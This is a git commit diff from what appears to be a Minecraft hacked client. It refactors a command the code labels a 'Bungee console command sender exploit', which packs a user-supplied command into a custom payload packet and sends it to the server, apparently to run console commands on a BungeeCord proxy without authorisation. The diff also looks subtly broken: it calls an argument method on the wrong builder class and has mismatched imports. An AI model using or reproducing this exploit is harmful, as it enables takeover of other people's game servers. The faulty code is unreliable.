685644451e6661aa6b3d44dfc3c508c862654e7e
Joyel99Dev <164185653+McpeDX@users.noreply.github.com>
2025-07-09 10:19:06 +0530

    Update BungeeConsole.java

--- src/main/java/net/paradise_client/command/impl/BungeeConsole.java
+++ src/main/java/net/paradise_client/command/impl/BungeeConsole.java
@@ -1,33 +1,39 @@
 package net.paradise_client.command.impl;
 
-import com.mojang.brigadier.arguments.ArgumentType;
 import com.mojang.brigadier.arguments.StringArgumentType;
 import com.mojang.brigadier.builder.LiteralArgumentBuilder;
 import com.mojang.brigadier.context.CommandContext;
-import net.paradise_client.Helper;
-import net.minecraft.command.CommandSource;
-import net.minecraft.Packet;
-import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
+
 import net.minecraft.client.MinecraftClient;
-import net.minecraft.CustomPayload;
+import net.minecraft.command.CommandSource;
+import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
+
+import net.paradise_client.Helper;
+import net.paradise_client.command.Command;
+import net.paradise_client.packet.BungeeCommandPacket; // Adjust if your writer is located elsewhere
 
 public class BungeeConsole extends Command {
+
     public BungeeConsole(MinecraftClient minecraftClient) {
         super("atlas", "Bungee console command sender exploit", minecraftClient);
     }
 
     @Override
     public LiteralArgumentBuilder<CommandSource> build() {
-        return (BungeeConsole.literal(this.getName()).executes(context -> {
-            Helper.printChatMessage("Incomplete command!");
-            return 1;
-        })).then(BungeeConsole.argument("command", StringArgumentType.greedyString()).executes(this::build));
+        return LiteralArgumentBuilder.<CommandSource>literal(this.getName())
+            .executes(context -> {
+                Helper.printChatMessage("Incomplete command!");
+                return 1;
+            })
+            .then(LiteralArgumentBuilder.<CommandSource>argument("command", StringArgumentType.greedyString())
+                .executes(this::executeCommand));
     }
 
-    private int build(CommandContext<?> context) {
-        Helper.sendPacket(new CustomPayloadC2SPacket(new BungeeCommandWriter(context.getArgument("command", String.class))));
+    private int executeCommand(CommandContext<?> context) {
+        String command = context.getArgument("command", String.class);
+        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(new BungeeCommandWriter(command));
+        Helper.sendPacket(packet);
         Helper.printChatMessage("Payload sent!");
         return 1;
-   
     }
-                                        }
+}
